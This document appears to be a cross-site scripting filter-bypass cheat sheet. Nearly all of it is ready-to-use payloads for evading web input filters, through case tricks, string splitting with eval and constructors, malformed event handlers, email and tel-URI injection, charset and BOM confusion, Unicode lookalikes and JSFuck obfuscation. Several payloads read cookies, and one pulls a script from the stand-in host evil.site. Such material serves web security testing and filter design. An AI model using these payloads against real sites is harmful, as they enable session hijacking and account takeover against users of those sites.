# XSS Filter Bypass

## Summary

- [Bypass Case Sensitive](#bypass-case-sensitive)
- [Bypass Tag Blacklist](#bypass-tag-blacklist)
- [Bypass Word Blacklist with Code Evaluation](#bypass-word-blacklist-with-code-evaluation)
- [Bypass with Incomplete HTML Tag](#bypass-with-incomplete-html-tag)
- [Bypass Quotes for String](#bypass-quotes-for-string)
- [Bypass Quotes in Script Tag](#bypass-quotes-in-script-tag)
- [Bypass Quotes in Mousedown Event](#bypass-quotes-in-mousedown-event)
- [Bypass Dot Filter](#bypass-dot-filter)
- [Bypass Parenthesis for String](#bypass-parenthesis-for-string)
- [Bypass Parenthesis and Semi Colon](#bypass-parenthesis-and-semi-colon)
- [Bypass onxxxx= Blacklist](#bypass-onxxxx-blacklist)
- [Bypass Space Filter](#bypass-space-filter)
- [Bypass Email Filter](#bypass-email-filter)
- [Bypass Tel URI Filter](#bypass-tel-uri-filter)
- [Bypass document Blacklist](#bypass-document-blacklist)
- [Bypass document.cookie Blacklist](#bypass-document-cookie-blacklist)
- [Bypass using Javascript Inside a String](#bypass-using-javascript-inside-a-string)
- [Bypass using an Alternate Way to Redirect](#bypass-using-an-alternate-way-to-redirect)
- [Bypass using an Alternate Way to Execute an Alert](#bypass-using-an-alternate-way-to-execute-an-alert)
- [Bypass ">" using Nothing](#bypass--using-nothing)
- [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
- [Bypass ";" using Another Character](#bypass--using-another-character)
- [Bypass using Missing Charset Header](#bypass-using-missing-charset-header)
- [Bypass using HTML encoding](#bypass-using-html-encoding)
- [Bypass using Katakana](#bypass-using-katakana)
- [Bypass using Cuneiform](#bypass-using-cuneiform)
- [Bypass using Lontara](#bypass-using-lontara)
- [Bypass using ECMAScript6](#bypass-using-ecmascript6)
- [Bypass using Octal encoding](#bypass-using-octal-encoding)
- [Bypass using Unicode](#bypass-using-unicode)
- [Bypass using UTF-7](#bypass-using-utf-7)
- [Bypass using UTF-8](#bypass-using-utf-8)
- [Bypass using UTF-16be](#bypass-using-utf-16be)
- [Bypass using UTF-32](#bypass-using-utf-32)
- [Bypass using BOM](#bypass-using-bom)
- [Bypass using JSfuck](#bypass-using-jsfuck)
- [References](#references)


## Bypass Case Sensitive

To bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercase letters within the tags or function names.

```javascript
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
```

Since many XSS filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by tricking simple case-sensitive filters.


## Bypass Tag Blacklist

```javascript
<script x>
<script x>alert('XSS')<script y>
```

## Bypass Word Blacklist with Code Evaluation

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

## Bypass with Incomplete HTML Tag

Works on IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror='alert(0)' <
```

## Bypass Quotes for String

```javascript
String.fromCharCode(88,83,83)
```

## Bypass Quotes in Script Tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

## Bypass Quotes in Mousedown Event

You can bypass a single quote with &#39; in an on mousedown event handler

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

## Bypass Dot Filter

```javascript
<script>window['alert'](document['domain'])</script>
```

Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
http://www.geektools.com/cgi-bin/ipconv.cgi

```javascript
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

## Bypass Parenthesis for String

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

## Bypass Parenthesis and Semi Colon

* From @garethheyes
    ```javascript
    <script>onerror=alert;throw 1337</script>
    <script>{onerror=alert}throw 1337</script>
    <script>throw onerror=alert,'some string',123,'haha'</script>
    ```

* From @terjanq
    ```js
    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
    ```

* From @cgvwzq
    ```js
    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
    ```

## Bypass onxxxx Blacklist

* Use less known tag
    ```html
    <object onafterscriptexecute=confirm(0)>
    <object onbeforescriptexecute=confirm(0)>
    ```

* Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
    ```html
    <img src='1' onerror\x00=alert(0) />
    <img src='1' onerror\x0b=alert(0) />
    <img src='1' onerror\x0d=alert(0) />
    <img src='1' onerror\x0a=alert(0) />
    ```

* Bypass onxxx= filter with a '/'
    ```js
    <img src='1' onerror/=alert(0) />
    ```


## Bypass Space Filter

* Bypass space filter with "/"
    ```javascript
    <img/src='1'/onerror=alert(0)>
    ```

* Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`
  ```html
  <svgonload=alert(1)>
  ```

```ps1
$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```


## Bypass Email Filter

* [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
  ```javascript
  "><svg/onload=confirm(1)>"@x.y
  ```

* [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
  ```javascript
  xss@example.com(<img src='x' onerror='alert(document.location)'>)
  ```


## Bypass Tel URI Filter

At least 2 RFC mention the `;phone-context=` descriptor:

* [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
* [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)

```javascript
+330011223344;phone-context=<script>alert(0)</script>
```


## Bypass Document Blacklist

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

## Bypass document.cookie Blacklist

This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.

```js
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

## Bypass using Javascript Inside a String

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

## Bypass using an Alternate Way to Redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

## Bypass using an Alternate Way to Execute an Alert

From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables

The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

Then calling alert is :

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

We can find "alert" with a regular expression like ^a[rel]+t$ :

```javascript
//bind function alert on new function a()
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} 

// then you can use a() with Object.keys
self[Object.keys(self)[a()]]("1") // alert("1")
```

Oneliner:

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

From [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

Bypass using an alternate way to trigger an alert

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

## Bypass ">" using Nothing

There is no need to close the tags, the browser will try to fix it.

```javascript
<svg onload=alert(1)//
```

## Bypass "<" and ">" using ＜ and ＞

Use Unicode characters `U+FF1C` and `U+FF1E`, refer to [Bypass using Unicode](#bypass-using-unicode) for more.

```javascript
＜script/src=//evil.site/poc.js＞
```

## Bypass ";" using Another Character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```


## Bypass using Missing Charset Header

**Requirements**:

* Server header missing `charset`: `Content-Type: text/html`

### ISO-2022-JP

ISO-2022-JP uses escape characters to switch between several character sets.

| Escape    | Encoding        |
|-----------|-----------------|
| `\x1B (B` | ASCII           |
| `\x1B (J` | JIS X 0201 1976 |
| `\x1B $@` | JIS X 0208 1978 |
| `\x1B $B` | JIS X 0208 1983 |


Using the [code table](https://en.wikipedia.org/wiki/JIS_X_0201#Codepage_layout), we can find multiple characters that will be transformed when switching from **ASCII** to **JIS X 0201 1976**.

| Hex  | ASCII | JIS X 0201 1976 |
| ---- | --- | --- |
| 0x5c | `\` | `¥` | 
| 0x7e | `~` | `‾` |


**Example**

Use `%1b(J` to force convert a `\'` (ascii) in to `¥'` (JIS X 0201 1976), unescaping the quote.

Payload: `search=%1b(J&lang=en";alert(1)//`


## Bypass using HTML Encoding

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

## Bypass using Katakana

Using the [aemkei/Katakana](https://github.com/aemkei/katakana.js) library.

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

## Bypass using Cuneiform

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

## Bypass using Lontara

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

More alphabets on http://aem1k.com/aurebesh.js/#

## Bypass using ECMAScript6

```html
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

## Bypass using Octal encoding


```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

## Bypass using Unicode

This payload takes advantage of Unicode escape sequences to obscure the JavaScript function

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
```

It uses Unicode escape sequences to represent characters.

| Unicode  | ASCII     |
| -------- | --------- |
| `\u0061` | a         |
| `\u006C` | l         |
| `\u0065` | e         |
| `\u0072` | r         |
| `\u0074` | t         |


Same thing with these Unicode characters.

| Unicode (UTF-8 encoded) | Unicode Name                 | ASCII | ASCII Name     |
| ----------------------- | ---------------------------- | ----- | ---------------|
| `\uFF1C` (%EF%BC%9C)    | FULLWIDTH LESS­THAN SIGN      | <     | LESS­THAN       |
| `\uFF1E` (%EF%BC%9E)    | FULLWIDTH GREATER­THAN SIGN   | >     | GREATER­THAN    |
| `\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | "     | QUOTATION MARK |
| `\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE     |


An example payload could be `ʺ＞＜svg onload=alert(/XSS/)＞/`, which would look like that after being URL encoded:

```javascript
%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
```


When Unicode characters are converted to another case, they might bypass a filter look for specific keywords.

| Unicode  | Transform | Character |
| -------- | --------- | --------- |
| `İ` (%c4%b0) | `toLowerCase()` | i |
| `ı` (%c4%b1) | `toUpperCase()` | I |
| `ſ` (%c5%bf) | `toUpperCase()` | S |
| `K` (%E2%84) | `toLowerCase()` | k |

The following payloads become valid HTML tags after being converted.

```html
<ſvg onload=... >
<ıframe id=x onload=>
```


## Bypass using UTF-7

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

## Bypass using UTF-8

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

## Bypass using UTF-16be

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

## Bypass using UTF-32

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

## Bypass using BOM

Byte Order Mark (The page must begin with the BOM character.)
BOM character allows you to override charset of the page

```js
BOM Character for UTF-16 Encoding:
Big Endian : 0xFE 0xFF
Little Endian : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

BOM Character for UTF-32 Encoding:
Big Endian : 0x00 0x00 0xFE 0xFF
Little Endian : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```


## Bypass using JSfuck

Bypass using [jsfuck](http://www.jsfuck.com/)

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```


## References

- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities - Brett Buerhaus (@bbuerhaus) - March 8, 2017](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)